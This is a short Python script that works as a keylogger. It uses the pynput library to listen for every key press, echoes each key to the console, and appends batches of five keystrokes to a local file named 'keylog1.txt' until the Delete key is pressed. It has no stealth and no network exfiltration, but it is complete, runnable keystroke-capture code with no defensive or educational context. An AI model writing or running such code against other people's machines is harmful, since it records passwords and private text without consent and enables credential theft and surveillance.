from pynput.keyboard import Key,Listener

count = 0
key_press = []
def on_press(key):
    global count, key_press

    key_press.append(key)
    count = count + 1
    print(key, " pressed")

    if count >= 5:
        count = 0
        log_write(key_press)
        key_press = []  
        

def log_write(key_press):
    with open("keylog1.txt","a") as f:
        for key in key_press: 
            i = str(key).replace("'","")
            if i.find("space")>0:
                f.write('\n')
            # elif i.find("Key.backspace")>0:
            #     f.write("backspace")
            #     f.write(" ")
            else:
                f.write(str(key))
                f.write("  ")

def on_release(key):
    if key == Key.delete:
        return False

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()